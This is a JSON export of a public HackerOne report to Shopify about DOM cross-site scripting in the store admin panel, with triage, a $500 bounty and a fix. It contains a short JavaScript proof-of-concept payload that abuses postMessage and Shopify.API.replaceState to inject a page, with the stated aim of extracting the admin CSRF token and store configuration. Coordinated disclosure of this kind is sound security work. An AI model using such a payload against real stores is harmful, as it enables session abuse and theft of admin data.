{"id":883867,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODM4Njc=","url":"https://hackerone.com/reports/883867","title":"Inject page in admin panel via Shopify.API.pushState [New Payload]","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2020-05-27T19:05:49.705Z","submitted_at":"2020-05-27T19:05:49.705Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"tems","url":"/tems","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/m8EUENYLU5dmCd7GCktjyfc8/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-12-27T22:14:47.302Z","bug_reporter_agreed_on_going_public_at":"2020-12-27T22:14:47.236Z","team_member_agreed_on_going_public_at":"2020-08-18T19:49:18.265Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The correction for #868615, allows you to use new payload:\n\n```js\nconst ctx = window.open(location.origin+'/admin/themes', '_blank')\nconst data = JSON.stringify({\n                  message: 'Shopify.API.replaceState',\n                  data: {pathname: \"abc:d../pages/xss#//\"}\n});\nctx.postMessage(data)\n```\n\n## Impact\n\nAbuse the active admin session to extract data as:\n\n- CSRF token.\n- Store config.","vulnerability_information_html":"\u003cp\u003eThe correction for \u003ca href=\"/reports/868615\"\u003e#868615\u003c/a\u003e, allows you to use new payload:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003ectx\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003ewindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eorigin\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/admin/themes\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e_blank\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eJSON\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estringify\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e\n                  \u003cspan class=\"na\"\u003emessage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eShopify.API.replaceState\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                  \u003cspan class=\"na\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"na\"\u003epathname\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eabc:d../pages/xss#//\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"nx\"\u003ectx\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epostMessage\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003edata\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAbuse the active admin session to extract data as:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eCSRF token.\u003c/li\u003e\n\u003cli\u003eStore config.\u003c/li\u003e\n\u003c/ul\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":10,"voters":["mygf","tems","zerox4","zxtshadow","santhosh07","prasannaryakala","thallesisnipe","fezrarenisha","thewesdias","jazibobs"],"severity":{"rating":"low","author_type":"User"},"structured_scope":{"databaseId":413,"asset_type":"URL","asset_identifier":"your-store.myshopify.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8124279,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the issue, and our engineering team is working on a fix. We'll be in touch again soon regarding a bounty.","markdown_message":"\u003cp\u003eThank you for your report. We\u0026#39;ve reproduced the issue, and our engineering team is working on a fix. We\u0026#39;ll be in touch again soon regarding a bounty.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-27T21:47:33.586Z","updated_at":"2020-05-27T21:47:33.586Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8134465,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for your report. We're awarding a $500 bounty for this issue under the \"Cross-site scripting - stored\" category for Shopify Core. Although script execution occurs in the storefront area, it is not intended that storefront pages be displayed directly with the store's admin area. We'll be in touch again once a fix is in place.","markdown_message":"\u003cp\u003eThanks again for your report. We\u0026#39;re awarding a $500 bounty for this issue under the \u0026quot;Cross-site scripting - stored\u0026quot; category for Shopify Core. Although script execution occurs in the storefront area, it is not intended that storefront pages be displayed directly with the store\u0026#39;s admin area. We\u0026#39;ll be in touch again once a fix is in place.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-28T17:28:06.049Z","updated_at":"2020-05-28T17:28:06.049Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"tems","url":"/tems"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8794192,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey @tems!\nThanks again for your report. We have recently deployed a fix for this issue, and you should no longer be able to reproduce this behaviour. \nThank you for taking the time to hack on Shopify, and we hope to hear from you again soon!","markdown_message":"\u003cp\u003eHey \u003ca href=\"/tems\"\u003e@tems\u003c/a\u003e!\u003cbr\u003e\nThanks again for your report. We have recently deployed a fix for this issue, and you should no longer be able to reproduce this behaviour. \u003cbr\u003e\nThank you for taking the time to hack on Shopify, and we hope to hear from you again soon!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-29T14:33:39.881Z","updated_at":"2020-07-29T14:33:39.881Z","actor":{"username":"jenn-shopify","cleared":false,"url":"/jenn-shopify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"tems","url":"/tems"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8972334,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-18T19:49:18.287Z","updated_at":"2020-08-18T19:49:18.287Z","first_to_agree":true,"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10213734,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-12-27T22:14:47.260Z","updated_at":"2020-12-27T22:14:47.260Z","actor":{"username":"tems","cleared":false,"url":"/tems","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/m8EUENYLU5dmCd7GCktjyfc8/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10213735,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-12-27T22:14:47.328Z","updated_at":"2020-12-27T22:14:47.328Z","actor":{"username":"tems","cleared":false,"url":"/tems","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/m8EUENYLU5dmCd7GCktjyfc8/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}